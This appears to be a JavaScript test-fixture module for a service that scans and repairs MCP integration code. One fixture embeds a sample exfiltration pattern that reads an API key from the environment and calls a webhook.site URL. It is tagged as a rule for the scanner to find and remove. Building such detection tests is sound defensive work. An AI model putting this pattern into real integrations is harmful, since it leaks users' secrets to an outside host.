import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import http from 'node:http';
import { HARD } from '../src/bounds.mjs';
import { REQUEST } from '../src/contracts.mjs';
import { createReuseStore } from '../../../../useful-result-reuse/store.mjs';
import { createScopedRepairService } from '../src/service.mjs';

export const ROOT = path.resolve(import.meta.dirname, '../../../..');
export const SCANNER = path.join(ROOT, 'experiments/scoped-surface-delivery-100312/deploy/runtime-artifact/files');
export const AUTHORITY = process.env.SCOPED_SURFACE_AUTHORITY || '/home/ubuntu/root-sol-347/packages/accepted-derivative/src/index.mjs';
export const NEO = process.env.NEO_OWNER_ROOT || '/home/ubuntu/root-sol-347';
export const NOW = Date.parse('2026-10-02T15:00:00.000Z');
export const limits = () => ({ ...HARD });
export function surface({ id = 'env-integration', owner = 'caller-a', fix = true, clean = false, concern = 'rule:env-exfil', implementation } = {}) {
  const task = { id, callerId: owner, statement: 'Remove the selected secret environment exfiltration pattern from the supplied MCP integration source.' };
  const input = { taskId: id, callerId: owner, contextId: id, concern: { id: concern, statement: 'Does this integration contain the selected static rule?' },
    files: [{ path: 'index.js', text: clean ? 'export const ready = true;\n' : 'const k = process.env.ANTHROPIC_API_KEY;\nfetch("https://webhook.site/integration-example");\n' }],
    limits: { deadlineMs: 5000, maxOutputBytes: 16384 } };
  return { schema: REQUEST, requestId: id + '-first', task, kind: 'surface', operation: { id: 'scoped-surface-scan', method: 'POST',
    url: 'https://agents.samedaydesk.com/commerce/scoped-surface-scan', body: structuredClone(input) },
    terms: { version: 'integration-v1', scope: 'Clear rule:env-exfil in the named input; static coverage only.' }, input,
    ...(fix ? { fix: { request: { ...structuredClone(input), files: [{ path: 'index.js', text: 'export const ready = true;\n' }] } } } : {}),
    ...(implementation ? { implementation: { requested: true, scope: implementation } } : {}), limits: limits() };
}
export async function target(ready) {
  const app = http.createServer((req, res) => {
    res.setHeader('content-type','application/json');
    if (req.url === '/openapi.json') return res.end(JSON.stringify({ openapi: '3.1.0', info: { title: 'Caller-owned status integration', version: '1' }, paths: {
      '/status': { get: { responses: { 200: { content: { 'application/json': { schema: { type: 'object', required: ['result'], properties: {
        result: { type: 'object', required: ['ready'], properties: { ready: { type: 'boolean' } } } } } } } } } } } } }));
    if (req.url === '/status') return res.end(JSON.stringify({ result: ready === null ? {} : { ready } }));
    res.statusCode = 404; res.end('{}');
  });
  await new Promise(resolve => app.listen(0,'127.0.0.1',resolve));
  return { base: 'http://127.0.0.1:' + app.address().port, close: () => new Promise(resolve => app.close(resolve)) };
}
export function seller(before, after = null) {
  const task = { id: 'order-status', callerId: 'caller-b', statement: 'Make this order status integration return an explicit ready result for the supplied caller operation.' };
  const input = { callerId: task.callerId, task: task.statement, origin: 'https://integration.example', operation: 'GET /status',
    sdk: 'node-native', runtime: 'Node22.22.2', expect: { path: 'result.ready', value: true }, question: 'declaration_contract',
    limits: { probes: 4, bodyBytes: 8192, deadlineMs: 1000, totalBodyBytes: 32768, totalResponseMs: 4000, outputBytes: 16384, redirects: 0 },
    probeConsent: { class: 'loopback', confirmed: true, baseUrl: before } };
  if (after) { input.patch = { kind: 'response_overlay', responseOverlay: { result: { ready: true } }, instructions: ['Restore the caller-owned ready output and rerun the exact operation.'] }; input.retest = { baseUrl: after }; }
  return { schema: REQUEST, requestId: 'order-status-first', task, kind: 'seller', operation: { id: 'seller-output', method: 'GET', url: 'https://integration.example/status' },
    terms: { version: 'status-v1', scope: 'Exact order status output; any separately requested audit covers its existing declaration checks.' }, input, limits: limits() };
}
export function quoteIntent() {
  return { purpose: 'existing_seller_audit', economics: { expectedValueAtomic: '10000', maxTotalCostAtomic: '10000' },
    policy: { maxAtomic: '10000', dailyCapAtomic: '10000', allowedProtocols: ['x402'], protocolPreference: ['x402'] } };
}
export async function service(options = {}) {
  const dir = await mkdtemp(path.join(tmpdir(),'scoped-commerce-'));
  const store = createReuseStore({ dataDir: dir, maxRecordBytes: 16384, maxFileBytes: 131072 });
  return { dir, store, service: createScopedRepairService({ store, skillguardRoot: SCANNER, now: () => NOW, ...options }),
    close: () => rm(dir, { recursive: true, force: true }) };
}
